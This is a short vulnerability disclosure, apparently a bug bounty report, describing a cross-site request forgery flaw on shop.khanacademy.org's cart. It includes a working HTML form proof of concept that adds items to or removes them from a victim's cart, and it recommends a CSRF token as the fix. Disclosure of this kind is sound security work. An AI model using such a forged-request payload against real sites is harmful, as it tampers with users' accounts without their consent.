Summary:

Hi there,

I've discovered a possiblity to remove/add items to a users' cart at shop.khanacademy.org.

###Details

```
- Host: shop.khanacademy.org
- URL: http://shop.khanacademy.org/cart
- Affected parameters: updates[PRODUCTID]
```


###Steps to reproduce
- 1. Visit http://shop.khanacademy.org/cart and empty your cart
- 2. Run the following CSRF PoC:

```
<html>
  <body>
    <form action="http://shop.khanacademy.org/cart" method="POST">
      <input type="hidden" name="updates&#91;211669705&#93;" value="1" />
      <input type="hidden" name="update" value="Update&#32;quantities" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

- 3. Take a look into your cart again
- 4. There should be a new item. 

An attacker can set the quantity to zero to remove an item or increase / add new items to the cart. 

###How to fix?
You should add a CSRF token to the form. 

Best regards,
